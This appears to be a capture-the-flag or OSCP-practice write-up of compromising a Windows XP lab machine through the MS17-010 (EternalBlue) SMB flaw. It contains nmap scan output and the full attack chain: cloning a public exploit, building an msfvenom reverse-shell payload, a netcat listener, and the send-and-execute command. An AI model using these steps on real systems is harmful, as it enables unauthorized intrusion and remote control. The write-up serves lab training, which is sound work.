## Port Scanning

First we need to do a port scan to know what are we trying to exploit.

```bash
PORT    STATE SERVICE     REASON          VERSION
135/tcp open  msrpc       syn-ack ttl 127 Microsoft Windows RPC
139/tcp open  netbios-ssn syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp open              syn-ack ttl 127 Windows XP microsoft-ds
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

| smb-security-mode:

```

Look like we have two smb ports the 139,445 so we are going to focus on them.

## Enumeration

With `sudo nmap 10.10.10.14 -p 139,445 --script=vuln` I am going to see if nmap can see some vulnerabilities.

```bash
Host script results:
|_smb-vuln-ms10-054: false
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (sudo)

```

I found two possible vulnerabilities the MS17-010 (CVE-2017-0143) and MS08-067 (CVE-2008-4250) but because I have SMB v1 I am going to exploit the first one.

## Exploiting

The CVE-2017-0143 or better called Eternal Blue is a vulnerability that allows us to exploit the Microsoftâ€™s implementation of the Server Message Block (SMB) protocol with a crafted package to have RCE in the victim machine. 

I can exploit the machine easily with metasploit but I am going to try another way more oscp friendly.

If we google MS17-010 we can found a git repository: https://github.com/helviojunior/MS17-010.git

```bash
git clone https://github.com/helviojunior/MS17-010.git
```

Once we cloned the exploit letâ€™s get a reverse shell with mfsvenom (Legal in OSCP).

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.17 LPORT=4444 -f exe > eternalblue.exe
```

With a listener and sending the reverse shell with the help of the exploit we are able to own the machine.

```bash
nc -lv 4444
```

```bash
python send_and_execute.py 10.10.10.4 ~/Documents/exploits/eternalblue.exe
```

## Gaining an Initial Foothold

We are in now, with `dir user.txt /s` and `dir root.txt /s` we can know where is the flags.

## Lessons Learned

- What insights did you gain from the room?
    
    Now, we know how to perform a windows samba attack with the eternal blue vulnerability that allows me to RCE the victim machine.
    
- Were there any novel tools or techniques employed?
    
    I performed a CVE-2017-0143 exploit and msfvenom reverse shell.
